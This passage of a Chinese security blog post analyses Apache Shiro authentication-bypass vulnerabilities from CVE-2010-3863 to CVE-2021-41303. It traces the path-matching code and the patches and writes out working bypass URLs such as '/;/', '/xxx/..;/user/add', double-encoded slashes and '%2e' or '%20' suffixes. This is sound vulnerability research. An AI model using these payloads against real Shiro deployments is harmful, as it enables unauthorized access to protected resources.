Filter，每一个请求都会经过这个 Filter。\n\n\n第一段的请求如上面调用栈所示，会最终去到 PathMatchingFilterChainResolver.getChain()\n通过 getFilterChainResolver() 就拿到了上面提到的过滤器执行链解析器PathMatchingFilterChainResolver，然后再调用它的 getChain() 匹配获取过滤器，最终过滤器在executeChain() 中被执行。\n\n\nPathMatchingFilterChainResolver.getChain() 将过滤路径与过滤规则拿出去，具体的业务在 pathMatches() 下\n\n\n\n\n跟进 pathMatcher.matches() 方法\n\n\n一通跟进，到了 org.apache.shiro.util.AntPathMatcher#doMatch() 方法，这个方法说来很玄乎啊，因为之前从 ShiroConfig.java 里面获取过所有的 url 路径，这个路径其实和对应的鉴权规则是一个键值对，所以在获取路径的时候同时也把鉴权规则获取了，只要判断当前路径与所有路径当中的某个匹配，就可以拿到那个路径对应的鉴权规则。\n\n\n比如这里已经判断路径相同了，跟进 filterChainManager.proxy()，跟进 getChain(chianName) 方法，这一步把鉴权规则赋值给 configured 变量。\n\n\n\n\n这里用枚举列出了所有 Shiro 内置过滤器的实例。（虽然具体流程找了很多资料，包括自己分析，没看到是哪里去匹配的，后续空了再看看吧）\npublic enum DefaultFilter &#123;\n    anon(AnonymousFilter.class),\n    authc(FormAuthenticationFilter.class),\n    authcBasic(BasicHttpAuthenticationFilter.class),\n    logout(LogoutFilter.class),\n    noSessionCreation(NoSessionCreationFilter.class),\n    perms(PermissionsAuthorizationFilter.class),\n    port(PortFilter.class),\n    rest(HttpMethodPermissionFilter.class),\n    roles(RolesAuthorizationFilter.class),\n    ssl(SslFilter.class),\n    user(UserFilter.class);\n&#125;\n\n这里我们的权限是 perms:add，对应的过滤器是 org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter，所以在 SpringShiroFilter 对请求处理完毕之后，就会用 PermissionsAuthorizationFilter 来处理请求。如图，这也是第二次请求\n\n\n往下，调用了 doFilterInternal() 方法，跟进\n\n\n关于 continueChain 这里调用了 preHandle() 方法来判断这个请求是否合理，可以跟进去看一下代码逻辑，比较简单。\n\n\n简单来说就是将 this.appliedPaths，也就是我们之前在 ShiroConfig 里面定义要进行处理的 url，shiro 会判断目前请求的 url 与设置的是否相同（经过循环）；如果相同则返回 true，继续进行对应的权限 Filter 处理。如果不同则跳出，直接将请求完成。\n回到 doFilterInternal() 方法下，判断 continueChain 是否为 true，如果为 true 则执行 executeChain() 方法，跟进。\n\n\n继续跟进 doFilter() 方法，判断了 this.filters 是否为空，如果不，则继续调用 this.orig.doFilter() 方法\n\n\n跟进，会发现进到了 ApplicationFilterChain 类的 doFilter() 方法，后面的请求都是由 Tomcat 来完成的\n\n\n\nFilter 名称\n对应类\n\n\n\n\nanon\norg.apache.shiro.web.filter.authc.AnonymousFilter\n\n\nauthc\norg.apache.shiro.web.filter.authc.FormAuthenticationFilter\n\n\nauthcBasic\norg.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter\n\n\nauthcBearer\norg.apache.shiro.web.filter.authc.BearerHttpAuthenticationFilter\n\n\ninvalidRequest\norg.apache.shiro.web.filter.InvalidRequestFilter\n\n\nlogout\norg.apache.shiro.web.filter.authc.LogoutFilter\n\n\nnoSessionCreation\norg.apache.shiro.web.filter.session.NoSessionCreationFilter\n\n\nperms\norg.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter\n\n\nport\norg.apache.shiro.web.filter.authz.PortFilter\n\n\nrest\norg.apache.shiro.web.filter.authz.HttpMethodPermissionFilter\n\n\nroles\norg.apache.shiro.web.filter.authz.RolesAuthorizationFilter\n\n\nssl\norg.apache.shiro.web.filter.authz.SslFilter\n\n\nuser\norg.apache.shiro.web.filter.authc.UserFilter\n\n\n\n\n0x03 CVE-2010-3863漏洞详情Shiro 在路径控制的时候，未能对传入的 url 编码进行 decode 解码，导致攻击者可以绕过过滤器，访问被过滤的路径。\n漏洞影响版本Shiro 1.0.0-incubating\n对应 Maven Repo 里面也有\n\n\n环境搭建这个比 Shiro550、Shiro721 要增加一些东西，首先看 pom.xml 这个配置文件，因为漏洞是 shiro 1.0.0 版本的\n&lt;dependency>  \n    &lt;groupId>org.apache.shiro&lt;/groupId>  \n    &lt;artifactId>shiro-core&lt;/artifactId>  \n    &lt;version>1.0.0-incubating&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n    &lt;groupId>org.apache.shiro&lt;/groupId>  \n    &lt;artifactId>shiro-web&lt;/artifactId>  \n    &lt;version>1.0.0-incubating&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n    &lt;groupId>org.apache.shiro&lt;/groupId>  \n    &lt;artifactId>shiro-spring&lt;/artifactId>  \n    &lt;version>1.0.0-incubating&lt;/version>  \n&lt;/dependency>\n\n调整 ShiroConfig.java，增加代码如下\nfilterMap.put(\"/user/add\",\"perms[user:add]\");  \nfilterMap.put(\"/user/update\",\"perms[user:update]\");  \nfilterMap.put(\"/secret.html\",\"authc,roles[admin]\");  \n  \nfilterMap.put(\"/user/*\", \"authc\");  \nfilterMap.put(\"/**\",\"anon\")\n\n\nHTML 文件 ———— static&#x2F;secret.html\n&lt;!DOCTYPE html>  \n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">  \n&lt;head>  \n    &lt;meta charset=\"UTF-8\">  \n    &lt;title>首页&lt;/title>  \n&lt;/head>  \n&lt;body>  \n&lt;div>  \n    &lt;h1>秘密界面&lt;/h1>  \n&lt;/div>  \n&lt;/body>  \n&lt;/html>\n\n这时候访问 secret.html 会得到一个 302 的重定向\n\n\n用 PoC 打能够打通\n\n\n\n至此环境搭建完毕，当然搭建环境的时候可能会遇到如下这个报错\n\nunable to correctly extract the initialization vector or ciphertext.\n\n这个问题的解决方法是清除浏览器缓存即可。\n漏洞复现与分析先说 PoC，未标准化路径造成 /./ 越权访问\n\n\n把断点下在 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain() 处，开始调试\ngetChain() 方法会先将所有的 URI 保存到变量名为 i$ 的迭代器当中，然后逐一循环，进行 pathMatches() 的匹配。在循环两次之后，我们来看处理 /./secret.html 的代码。跟进 pathMatches() 方法\n\n\n跟进 pathMatcher.matches()，再跟进，最终是来到 org.apache.shiro.util.AntPathMatcher#doMatch()，这个方法做了具体的实现业务。\n首先判断目前请求的 URL 开头与目标 URL 的开头是否都为 /，如果不是则 return false；往下，调用了 StringUtils.tokenizeToStringArray() 方法，之前的 /secret.html 转化成了 [&quot;secret.html&quot;] 这个数组，/./secret.html 转换成了 [&quot;.&quot;,&quot;secret.html&quot;]\n\n\n继续往下，判断了 patDir 中是否存在 ** 字符，如果存在就 break；继续往下走，判断 html 的目录与当前请求的目录是否相同，因为我们请求被拆分出来是 [&quot;.&quot;,&quot;secret.html&quot;]，. 和 secret.html 不相同，所以会返回 false\n\n\n由于其不能与我们之前定的所有 URL 匹配，导致进入了 /** 的匹配范围，这里之前我们设定的访问方式是 /**,anon 无需认证即可访问，由此造成越权\n基于这个逻辑，/;/secret.html 的 bypass 方式也是合理的，可能一些其他特殊字符也是可以的，前提是对请求并不造成影响，像 ..，# 这类字符就会产生问题。\n\n\n报错字符报错信息如下\nInvalid character found in the request target [/\\/secret.html ]. The valid characters are defined in RFC 7230 and RFC 3986\n\n\n漏洞分析至此结束\n\n漏洞修复Shiro 在 Commit 更新中添加了标准化路径函数。对 /、//、/./、/../ 等进行了处理。\n0x04 CVE-2014-0074（shiro460)漏洞详情当程序使 用LDAP 服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。\n漏洞影响版本Shiro &lt; 1.2.3\n漏洞分析这里我没有复现这个洞，有兴趣的师傅可以看一下 su18 师傅的复现文章，这个洞本质上来说是配置文件的冲突。\nhttps://su18.org/post/shiro-1/#cve-2014-0074\n0x05 CVE-2016-6802漏洞详情Shiro 未对 ContextPath 做路径标准化导致权限绕过\n漏洞影响版本Shiro &lt; 1.3.2\n环境搭建\n一开始还是用的之前的环境，最终复现的时候出了问题，最后查了不少的资源终于发现。。。。其实是因为我的项目包还是 SpringBoot 包，但其实这个洞是 Servlet Context Path 的问题，所以导致一直打不通。\n\n最终借用了一个 Servlet Shiro 的项目包，代码在此处 https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Shiro/CVE-2016-6802\n漏洞复现与分析按照网上的 payload 复现\n漏洞复现\n\n访问 /drunkbaby/listProduct.jsp 回显 302。\n\n\n尝试 payload bypass /aa/../drunkbaby/listProduct.jsp，成功 200，造成越权。\n\n\n\n漏洞分析\n\n同样断点下在 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()，不同的是，这一次的分析我们不直接分析 /aa/../drunkbaby/listProduct.jsp，而是从白盒的角度看漏洞原因，有一个自己真正分析漏洞的过程。\n和前面的流程一样，同样是把所有的 URI 先放到迭代器里面，接着进行 pathMatches() 方法的处理，一路跟进到 org.apache.shiro.util.AntPathMatcher#doMatch()，这里和之前也是一样的。\n后来发现这里和 Shiro 1.0.0 的地方代码处理是一样的，感到很疑惑，那为啥不能用 Shiro 1.0 的 payload 直接打呢… 经过测试果然成功了？！算是自己独立发现的一点 bypass\n\n但其实这个洞和我自己认为的 payload /./ 与 /;/ 是两种的攻击方式，因为当时只是用 /drunkbaby/listProduct.jsp 探测的，所以没发现问题。\n\n按照漏洞描述，是 context_path 存在的 bypass，所以我们应该是在 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain() 的第 53 行跟进 getPathWithinApplication()，用的 PoC 是 /aa/../drunkbaby/listProduct.jsp\n\n\n跟进至 org.apache.shiro.web.util.WebUtils#getPathWithinApplication() 方法，这时候我们请求的 url 还是 /aa/../drunkbaby/listProduct.jsp，且 context path 为 /aa/../drunkbaby\n\n\n跟进 getContextPath() 方法，一路跟进\n\n\n最后是到了 org.apache.catalina.connector.Request#getContextPath() 方法，这里的关键点是 lashSlash 变量\n\n\nlashSlash 为 1，进入到 else 里面的判断逻辑。往下是 for 的循环，其中定义了 pos 变量，pos 变量是由 this.nextSlash() 方法得到的，跟进 nextSlash() 方法可以很简单的看出来这个方法就是以 / 进行截断，返回值是 / 前面的长度。而后面的 condidate 变量是去截取 url 里面的 / 内容\n\n\n往下走到下一个循环里面，这里先判断 contextPath 和 candidate 是否相同，如果不相同的话，会一直往下取 url，直到相同为止。比如这里我们先获取到的 candidate 其实是 /aa，它和 contextPath ———— /drunkbaby 不同，所以会继续往下取，往下取的 candidate 是 /..，还是不相同，直到取到相同为止。\n\n\n等到目前的 candidate 和 contextPath 相同之后，将后面的一段取出来。最后返回的是 /aa/../drunkbaby。而 /aa/../drunkbaby 与 /drunkbaby 并不相同，这就导致不会走进到 String path = requestUri.substring(contextPath.length()); 的逻辑\n\n\n这一段关于 contextPath 的处理与分析结束了，后续是去处理 requestUri 的，现在 requestUri 的值为 /drunkbaby/listProduct.jsp，我们的 shiro 鉴权仅限于是 /listProduct.jsp 的鉴权，所以说这一个请求其实根本就没有经过 shiro 了，那么它最后就变成了一个正常的请求，请求了 ———— /drunkbaby/listProduct.jsp，无需鉴权。（后面发现这个调用过程似乎不是这么简单）\n\n\n所以说这个洞本质上来说是因为 ContextPath 和 RequestURI 处理不一致。如果我修复的话肯定会对 ContextPath 下手。\n自己发现的 bypass 的分析，同时不带 contextPath\n先说说最开始发现这一种 bypass 的时候，也就是\n\n在实际漏洞利用阶段，我发现 /;/drunkbaby/listProduct.jsp 也可以绕过鉴权。且发现不需要 contextPath 也可以进行 bypass，其实这里我认为就是因为在 CVE-2010-3863 当中，Shiro 并未修复 /;/ 的 bypass，而是只是简单修复了 /./，/../ 的绕过鉴权方式，后续发现最新版本当中已经修完了这个洞，并且 Shiro&lt;&#x3D;1.3.1 的版本漏洞并不做处理。\n\n这里感觉上也差不多，对于 contextPath 这一块的处理时返回的 url 为 /\n\n最后这里会去找 request.getServletPath()，这里的值实际上就是正常请求的值\n\n\n由此我们的请求才是完成，不论是 /aa/../ 还是简单的 /;/ 都可以直接让 requestUri 返回错误的结果，从而导致这个结果不会被 shiro 鉴权模式匹配。\n讲完了最开始的 bypass 发现与分析，这里我们把不带 contextPath 也分析一下\n\n先放个 PoC\n\n\n\n\n\n开始调试，直接看 org.apache.shiro.web.util.WebUtils#getPathWithinApplication() 方法，之前的漏洞里面因为是 contextPath 的解析问题，所以跟进了 getContextPath() 方法。此时，uri 为 null，所以会将全部的请求 uri 拿进来，也就是 /;/listProduct.jsp\n\n\n先跟进 decodeAndCleanUriString() 方法，indexOf(59) 也就是第一次出现 ; 的位置，返回为 1，所以最后截取的 uri 也就是 /\n\n\n跟进 normalize()，这个方法其实是 CVE-2010-3863 这个洞的修复手段。说白了就是过滤了 /./，/../ 以及 //，这里我们的 uri 是 /，是不会有任何过滤的。\n\n\n回到 WebUtils 类当中，因为目前 contextPath 为空，所以直接走到 startsWithIgnoreCase() 方法判断后为 true 的逻辑当中。\n\n\n同理，最后既然返回的是 / 这个 url，不属于是 shiro 鉴权的 uri，所以会去加载后面的 getServletPath\n漏洞修复Shiro 官方修复如链接 Commit\n\n\n先做了 normalize(decodeRequestString()) 的过滤，这里其实并没有解决 /;/ 的 bypass，只是解决了最原始的 payload /aa/../\n我们可以思考一下，根据上面的代码逻辑，这里如果存在 contextPath，前面带有 /;/，最终拿到的 contextPath 是为空的，如此一来，就还是会走到 contextPath 为空的逻辑里面，也就是我上面分析的那一段。\n\n当然经测试，shiro 最新版本，也就是 1.11.0 版本当中，并不存在这一 bypass（要不然就是 0day 了哈哈，这么简单的洞也轮不到我发现\n\n0x06 CVE-2020-1957 与 Shiro682Shiro 权限绕过漏洞在 SpringBoot 高版本下的表现\n整个环境我已搭建完毕 \n\n在看后续漏洞之前我觉得有必要在这个地方提一提 Shiro682 这个洞\n\n关于 Shiro 682漏洞详情在 Spring 中，/drunkbaby/xx 与 /drunkbaby/xx/ 都会被处理成 /drunkbaby/xx。而在 Shiro 中，/drunkbaby/xx 与 /drunkbaby/xx/ 被视为不同的路径，所以在 Spring 集成 Shiro 时，只需要在访问路径后添加 / 就存在绕过权限校验的可能。\n漏洞影响版本Shiro &lt; 1.5.0\n环境搭建环境同最开始 Shiro 流程分析的环境，修改一下 Shiro 版本即可。\n漏洞复现与分析Shiro682 的攻击方式直接访问 authc 路径，302\n\n\n修改 url，也就是在最后面加上 /，成功 bypass\n\n\n\n既然是个 Spring 和 Shiro 的解析差异，那么应该去 Shiro 的处理 uri 的地方和 Spring 处理 uri 的地方下两个断点进行调试。\n\nShiro 的 uri 处理还是在 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()，spring 对于 uri 中结尾带 / 的处理是在这里 org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns()；这里先做 Shiro 的鉴权，再做 spring 的 uri 识别。\nShiro 的鉴权，不会把 /user/add 识别为 /user/add/，如图\n\n\n跟进 pathMatches() 方法，最终是返回 false\n\n\n\n接着我们来看 Spring 的处理，spring 在分发请求时 org.springframework.web.servlet.DispatcherServlet#doDispatch，会根据我们请求的 URI 选择一个最合适的 handler，其实就是从 DispatcherServlet#handlerMappings 找到能匹配路径的 Handler\n\norg.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns()\n整条调用栈如下\ngetMatchingPatterns:236, PatternsRequestCondition (org.springframework.web.servlet.mvc.condition)\ngetMatchingCondition:221, PatternsRequestCondition (org.springframework.web.servlet.mvc.condition)\ngetMatchingCondition:240, RequestMappingInfo (org.springframework.web.servlet.mvc.method)\ngetMatchingMapping:94, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)\ngetMatchingMapping:58, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)\naddMatchingMappings:427, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)\nlookupHandlerMethod:393, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)\ngetHandlerInternal:367, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)\ngetHandlerInternal:449, RequestMappingHandlerMapping (org.springframework.web.servlet.mvc.method.annotation)\ngetHandlerInternal:67, RequestMappingHandlerMapping (org.springframework.web.servlet.mvc.method.annotation)\ngetHandler:393, AbstractHandlerMapping (org.springframework.web.servlet.handler)\ngetHandler:1234, DispatcherServlet (org.springframework.web.servlet)\ndoDispatch:1016, DispatcherServlet (org.springframework.web.servlet)\n\n\n\n这里其实就可以看到 matches() 的判断为 true\n\n\n跟进 matches()，最终这里判断的代码其实是 org.springframework.web.servlet.handler.AbstractUrlHandlerMapping#match() 方法\n\n\n漏洞修复Commit 地址如链接，这是高版本用于修复 Shiro682 的补丁，本质上只是进行了尾部的 / 的处理，迁就了 Spring\n\n\n而关于 Shiro682 的处理，我们可以看到对于 Spring 不同版本实际上也有处理，但更为关键的是 Shiro 的处理。\n关于 CVE-2020-1957 的漏洞自己发现的一种 bypass，在高版本 SpringBoot 中可用说是 /user;/add 的 bypass，虽然也有一种说法，说这一种攻击才是正统的 CVE payload（后面发现这是我自己乱搞出来的，笑死\n从 PathMatchingFilterChainResolver.getChain() 下断点，跟进到 this.getPathWithinApplication() 方法，这里 uri = request.getRequestURI(); 出来的 uri 还是我们原始请求的那一个，往下走，跟进 normalize(decodeAndCleanUriString(request, uri)) ，这个方法之前我们提到过，会处理 /../，/./ 这一系列的 uri\n\n\n通过 indexOf() 截取到了 ; 之前的内容，所以 uri 最后返回回来的值的为 /user，那么后续自然而然，/user 与 /user/add 肯定不匹配，返回 false\n\n\n\n下面我们去看 Spring 是怎么处理请求的，其实当时看的参考文章和我的不太一样，这里算是踩坑了，不过还是自己分析吧，也是很快的 。\n\n倒也不完全是，我发现这里很多文章写的 payload 都是 /xxx/..;/user/add 这一种的越权，实际测试下来发现这一种不行，有的文章里面说是因为 SpringBoot 版本太高了，既然如此，能够有这一种的方便 bypass，还是自己分析一下吧。后续会简单提一下之前的 payload 是怎么打的。\n这里我先把断点下在了 org.springframework.web.servlet.DispatcherServlet#doDispatch() 方法处，因为这个方法是用来做 SpringBoot 的处理的，相当于是一个前端控制器。\n\n\n往下走，第 1043 行，DispatcherServlet 类收到请求调用 HandlerMapping 处理器映射器。处理器映射器根据请求 url 找到具体的处理器，生成处理器对象 Handler 及处理器拦截器(如果有则生成)一并返回给DispatcherServlet。\n\n\n这里匹配到的第一个 —— RequestMappingHandlerMapping 就是，我们跟进 getHandler() 方法看一下，一路跟进至 org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal 方法，在这个方法里做了具体业务，当然这里我们继续跟进 initLookupPath() 方法。\n\n\ninitLookupPath() 方法主要是做了 Uri 处理的初始化，这个 Uri 变量最终还是要经过一些处理，继续跟进 removeSemicolonContent() 方法。removeSemicolonContent() 方法的意思是判断是否需要删除分号内容，如果需要则跟进 removeSemicolonContentInternal() 方法，如果不需要的话就销毁此 session，将 Uri 返回，这一 Uri 就是正确的 Uri 了。\n\n\n这里我们需要去除分号，所以跟进 removeSemicolonContentInternal(requestUri) 方法\n\n\n后续就是老一套的 MVC 了，这里不再赘述。\n顺带再提一提 /xxx/..;/user/add 这个 payload\n这个 payload 是有要求的，要求 SpringBoot 的版本 &lt; 2.3，是很多师傅文章里面的 payload\n\n流程都是一样，DispatcherServlet 类收到请求调用 HandlerMapping 处理器映射器。这里匹配到的是 org.springframework.web.util.UrlPathHelper#getLookupPathForRequest\npublic String getLookupPathForRequest(HttpServletRequest request) &#123;\n        if (this.alwaysUseFullPath) &#123;\n            return this.getPathWithinApplication(request);\n        &#125; else &#123;\n            String rest = this.getPathWithinServletMapping(request);\n            return !\"\".equals(rest) ? rest : this.getPathWithinApplication(request);\n        &#125;\n    &#125;\n\n一整个调用栈如下\ngetRequestUri:326, UrlPathHelper (org.springframework.web.util)\ngetPathWithinApplication:244, UrlPathHelper (org.springframework.web.util)\ngetPathWithinServletMapping:195, UrlPathHelper (org.springframework.web.util)\ngetLookupPathForRequest:171, UrlPathHelper (org.springframework.web.util)\n\n直接跟进 decodeAndCleanUriString() 方法，代码如下，其实这一段在 Y4tacker 师傅 CVE-2016-6802 分析的时候也出现过\nprivate String decodeAndCleanUriString(HttpServletRequest request, String uri) &#123;\n        uri = this.removeSemicolonContent(uri);\n        uri = this.decodeRequestString(request, uri);\n        uri = this.getSanitizedPath(uri);\n        return uri;\n    &#125;\n\n跟进 removeSemicolonContent() 方法，主要问题是在这里\npublic String removeSemicolonContent(String requestUri) &#123;\n      return this.removeSemicolonContent ? this.removeSemicolonContentInternal(requestUri) : this.removeJsessionid(requestUri);\n  &#125;\n\n  private String removeSemicolonContentInternal(String requestUri) &#123;\n      for(int semicolonIndex = requestUri.indexOf(59); semicolonIndex != -1; semicolonIndex = requestUri.indexOf(59, semicolonIndex)) &#123;\n          int slashIndex = requestUri.indexOf(47, semicolonIndex);\n          String start = requestUri.substring(0, semicolonIndex);\n          requestUri = slashIndex != -1 ? start + requestUri.substring(slashIndex) : start;\n      &#125;\n\n      return requestUri;\n  &#125;\n\n这里分别依次调用三个方法,分别用来过滤;、urldecode、过滤//，这就导致最后返回的其实就是 /admin/index\n漏洞修复在 1.5.2 版本中对其进行了修复，获取 requestURI 的方式从 request.getRequestUri 直接获取的方式更改为获取 request 的 ContextPath，ServletPath，PathInfo，然后再重新拼接而成。\n\n\n输入的 /xxx/..;/user/add，将会被拼接为 //xxx/user/add 再进行 URI 路径匹配，则无法绕过拦截器。或者就返回 404，导致无法成功越权。\n0x07 CVE-2020-11989&#x2F;CVE-2020-13933CVE-2020-11989漏洞详情此漏洞有两种绕过方式，一种是之前我们说的/;/user/add 的绕过方式，且并不局限于 context-path，因为前面自己分析过了，就不再分析了。\n另外一种绕过方式是关于双层编码绕过，这个场景下需要一些限制条件，首先配置文件的 ant 风格需要是*而不是**，测试发现，? 也可以另外 controller 需要接收的 request 参数 (@PathVariable) 的类型需要是 String，否则将会出错。\n漏洞影响版本\nApache Shiro &lt; 1.5.3\n\n环境搭建添加一个 @PathVariable 的接口\n@ResponseBody  \n@GetMapping(\"/toJsonList/&#123;name&#125;\")  \npublic String namePage(@PathVariable String name)&#123;  \n    return name;  \n&#125;\n且添加 shiro 鉴权\nfilterMap.put(\"/toJsonList/*\", \"authc\");\n漏洞复现与分析只有 Shiro 1.5.2 版本是可以的，其他版本使用都是 400，不知道是不是我自己环境搭建的问题。访问未授权路径 302\n\n\n越权访问，payload /toJsonList/r%25%32%66oot，注意看。。。我当时这里被坑了\n\n\n测试发现下面四种组合只有前两组可以绕过\nyes\n&#x2F;toJsonList&#x2F;a%25%32%66a\n&#x2F;toJsonList&#x2F;%25%32%66\n\nno\n&#x2F;toJsonList&#x2F;%25%32%66a\n&#x2F;toJsonList&#x2F;a%25%32%66\n\n简单分析一下这个漏洞，因为还是老一套的断点 + 跟进，这里我就不再赘述了，直接讲最重要的部分 org.apache.shiro.web.util.WebUtils#getRequestUri()，我们楷爷先看一下 request 里面的 url 是什么\n\n\n我们原本的输入先经过自动的 url 一次解码，decodeAndCleanUriString() 方法是用来消除 ; 的，所以没什么影响，最后拿到的 url 是 /toJsonList/r/oot，那么这一个路径不是 /toJsonList/*，而是 /toJsonList/r/*，所以 shiro 鉴权变得无效了。\n后续通过 @PathVariable 注解，却会自动拼接 r%2foot，从而 200。\n观感来来说这种 bypass 非常鸡肋，我暂时想不到有什么能够利用的角度\n漏洞修复Commit 如链接所示\n可以看到，shiro建议使用 getPathWithinApplication() 方法获取路径减去上下文路径，或直接调用 HttpServletRequest.getRequestURI() 方法获取。\n在 WebUtils#getPathWithinApplication 方法，修改了使用 RequestUri 去除 ContextPath 的方式，改为使用 getServletPath(request) + getPathInfo(request))。然后使用 removeSemicolon 方法处理分号问题，normalize 方法进行路径标准化。\n而那一种  bypass，我觉得 Shiro 官方认为这是一种鸡肋的攻击方式，且利用条件比较苛刻，所以没有进行修复。\nCVE-2020-13933漏洞详情其实就是上文讲的鸡肋 bypass 的一种 bypass，虽然从利用角度来说很鸡肋，但是能找到这个漏洞确实是厉害。\n漏洞影响版本影响版本 shiro &lt; 1.6.0\n漏洞复现与分析payload 比较不一样，之前是二次的 url 编码，这次是 /toJsonList/%3broot，访问未授权界面 302\n\n\n通过 payload bypass\n\n\n关键处是在 org.apache.shiro.web.util.WebUtils#getPathWithinApplication()\n\n\nremoveSemicolon() 方法会把分号给移除，我们跟进看一下，这里挺重要的\n\n\n由于截取的是 ; 所在的位置，这就导致返回的 url 其实是 /toJsonList/，和 shiro 鉴权比较是 false 的\n\n\n而在 spring 当中 org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString\n这里流程是先去除;再解码，因此出现了问题\nprivate String decodeAndCleanUriString(HttpServletRequest request, String uri) &#123;\n  uri = this.removeSemicolonContent(uri);\n  uri = this.decodeRequestString(request, uri);\n  uri = this.getSanitizedPath(uri);\n  return uri;\n&#125;\n\n漏洞修复Commit 漏洞修复如链接\nshiro在1.6.0 版本中，org.apache.shiro.spring.web#ShiroFilterFactoryBean 中增加了 /** 的默认路径配置，使其可以全局匹配进行过滤校验。\n\n\n默认的/**配置对应一个全局的 filter：InvalidRequestFilter，这个类继承了 AccessControlFilter。用来过滤特殊字符（分号、反斜线、非ASCII码字符)，并返回 400 状态码。\n\n\n0x08 CVE-2020-17510&#x2F;CVE-2020-17523CVE-2020-17510漏洞详情同样是 bypass，同之前两种的 bypass 不太一样，用的是 . bypass\n漏洞影响版本Shiro &lt; 1.7.0\n漏洞复现与分析同样是 @PathVariable 才能打通，payload 为 /toJsonList/%2e，这个洞就更鸡肋了\n\n\n我觉得这个洞更为鸡肋的一点就是，它和之前的洞不一样，之前的洞的 name 是可控的，这里完全只能是 %2e，或者是其他 payload，但也仅限于此。\n当 Shiro 获得的 uri 为 /toJsonList 时，是无法和 /hello/* 匹配的，所以就在 /hello 后面加上 %2e，这样 Shiro 解码之后变成 /hello/.，然后路径标准化成为 /hello，绕过身份验证。\n\n\n下面的 payload 都可以使用，但还是那个问题，局限性比较大\n&#x2F;%2e\n&#x2F;%2e&#x2F;\n&#x2F;%2e%2e\n&#x2F;%2e%2e&#x2F;\n\n漏洞修复在Commit中发现 org.apache.shiro.spring.web 下新增了 ShiroUrlPathHelper 类，属于UrlPathHelper 的子类，重写了 getPathWithinApplication 和 getPathWithinServletMapping 两个方法\n\n\n\n其实这里修复的可以说是很差，有点敷衍了事且需要打补丁，具体这里我就不详细写了，有兴趣的师傅可以看 https://xz.aliyun.com/t/11633#toc-42\n\nCVE-2020-17523漏洞详情是 CVE-2020-17510 修复后的 bypass，这个漏洞可以使用空格 %20 进行绕过\n我们输入 payload 为 http://localhost:8080/toJsonList/%20 能够完成越权。\n漏洞影响版本Shiro &lt; 1.7.1\n漏洞复现与分析payload http://localhost:8080/toJsonList/%20\n同样的问题，不再赘述了\n漏洞修复在 Commit中，主要修复点 AntPathMatcher.java，在 tokenizeToStringArray 方法中加了 false 和 true 两个参数\n\n\n\n这里稍微总结一下，当然也是我自己的吐槽罢了，CVE-2020-13933 这四个类型的洞其实本质上都是同一个洞。\n\n0x09 CVE-2021-41303漏洞详情1.8.0 之前的 Apache Shiro，在 Spring Boot 中使用 Apache Shiro 时，特制的 HTTP 请求可能会导致身份验证绕过。用户应该更新到 Apache Shiro 1.8.0\n漏洞影响版本Shiro &#x3D; 1.7.1\n环境搭建需要 ShiroConfig 配置鉴权如下\nfilterMap.put(\"/toJsonList/*\", \"authc\");  \nfilterMap.put(\"/toJsonList/index\", \"authc\");\n\nController\n@ResponseBody  \n@GetMapping(\"/toJsonList/&#123;name&#125;/index\")  \npublic String namePage(@PathVariable String name)&#123;  \n    return name;  \n&#125;\n\n漏洞复现与分析参考三梦师傅的文章，这里主要是配置文件的利用角度，利用上比较有局限性，且只是 Shiro 1.7.1 版本特有的存在\nhttps://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/\n根据threedr3am师傅博客提供的方向，看了一下 Shiro 1.7.1 前后 PathMatchingFilterChainResolver#getChain 的对比，上面的是 1.7.1 版本的，下面是 1.7.0 版本的\n\n\n\n\n发现在 1.7.1 版本中，先是对 pathPattern 和 requestURI 进行比较，比较成功，返回：\nfilterChainManager.proxy(originalChain, pathPattern);\n\n否则对删除尾部斜线的 pathPattern 和 requestURI 进行比较，比较成功，跳出循环，返回：\nfilterChainManager.proxy(originalChain, requestURINoTrailingSlash);\n\n这就说明了其实我们如果构造两个 shiro 的鉴权，然后让它们经过处理之后能够 bypass 最终的鉴权即可。所以经过之前环境搭建那一步的铺垫，相信师傅们已经知道这个 bypass payload 了，也就是 /toJsonList/xxx/index，因为 shiro 的鉴权是从上往下的，先进行 toJsonList/* 的鉴权判断，再去做 toJsonList/index 的鉴权，同样不匹配，从而造成 bypass\n可是 Spring 还是会将 uri 解读成原本的。\n\n\n本质上还是由于鉴权出现的逻辑问题而造成的权限绕过\n漏洞修复直接将 filterChainManager.proxy 的第二个参数改为 pathPattern，直接传配置中的 uri 了\n\n\n0x10 CVE-2022-32532比较难以利用\n漏洞详情在 1.9.1 之前的 Apache Shiro 中，RegexRequestMatcher 可能会被错误配置，从而在某些 servlet 容器上被绕过。应用程序使用 RegExPatternMatcher 与 . 的正则表达式可能容易被授权绕过。\n漏洞影响版本shiro &lt; 1.9.1\n漏洞复现与分析详情可以看这位师傅写的文章 https://xz.aliyun.com/t/11633#toc-50\n0x11 